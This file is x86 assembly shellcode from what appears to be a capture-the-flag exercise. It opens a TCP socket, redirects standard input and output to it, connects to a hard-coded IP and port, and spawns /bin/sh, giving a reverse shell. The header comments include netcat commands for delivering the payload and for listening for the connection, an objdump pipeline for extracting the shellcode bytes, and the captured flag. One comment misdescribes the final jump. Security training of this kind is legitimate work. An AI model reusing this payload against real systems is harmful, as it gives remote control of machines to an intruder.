.intel_syntax noprefix

.section .text
.global _start

######## MY ADDRESS INFO ######## (tester3.kaist.ac.kr)
## IP: 143.248.136.13
## PORT: 55555
#################################

######## MY ADDRESS INFO in HEX ########
## IP: "\x8f\xf8\x88\x0d"
## PORT: "\xd9\x03"
########################################

# nc 143.248.38.212 30000 < payload
# gcc -nostdlib -g -m32 p3_a.s -o p3_a

# cmd to get hex from executable
# objdump -d problem3a | grep '[0-9a-f]:' | grep -oP '\s\K([0-9a-f]{2} )+' | tr -d ' \n' | sed 's/\(..\)/\\x\1/g'

# cmd to execute in local machine
# nc -lvnp 55555

# flag: SKCTF{y0u_5p4wn3d_4_x86_5h3ll}

_start: 
    # Set up the destination IP address (143.248.136.13 in hex: 0x8ff8880d).
    push   0xd88f88f
    pop    esi

    # Set up the destination port (55555 in hex: 0xd903).
    pushw  0x3d9
    pop    edi

    # Create a socket (socketcall syscall - syscall number 0x66 in eax)
    push   0x66
    pop    eax
    cdq

    # Set up the arguments for the socket creation.
    # Push 1 (SOCK_STREAM, for TCP) onto the stack.
    push   0x1            
    pop    ebx
    # Push 0 (protocol argument, set to 0) onto the stack.
    push   edx
    # Push `ebx` (1) again (socket type).
    push   ebx
    # Push 2 (AF_INET, for IPv4) onto the stack.
    push   0x2

# System call to create the socket.
syscall_socket:
    # Set `ecx` to point to the arguments (AF_INET, SOCK_STREAM, 0).
    mov    ecx,esp        
    int    0x80
    # Exchange `ebx` and `eax` (store socket file descriptor in `ebx`).
    xchg   ebx,eax
    pop    ecx

# Duplicate the socket file descriptor (dup2 syscall - used to redirect input/output).
duplicate_fd:
    mov    al,0x3f
    int    0x80
    dec    ecx
    jns    duplicate_fd

    # Connect the socket to the specified address and port.
    mov    al,0x66
    # ip address and port pushed
    push   esi
    push   di
    # Push 2 (AF_INET, for IPv4) onto the stack.
    pushw  0x2
    mov    ecx,esp
    # Push 16 (size of the sockaddr_in structure) onto the stack.
    push   0x10
    # Push the pointer to the sockaddr_in structure.
    push   ecx
    # Push the socket file descriptor.
    push   ebx
    # Set `ecx` to point to the arguments for the connect syscall.
    mov    ecx,esp
    int    0x80

    # Execve syscall to spawn /bin/sh
    mov    al,0xb
    push   edx
    # Push the string "//sh" onto the stack.
    # Push the string "/bin" onto the stack.
    push   0x68732f2f
    push   0x6e69622f
    # Set `ebx` to point to the string "/bin//sh".
    mov    ebx,esp
    # Push 0 (NULL, terminator for the envp array).
    push   edx
    # Push the pointer to "/bin//sh".
    push   ebx
    # Jump back to the start to restart the process or continue execution.
    jmp    syscall_socket
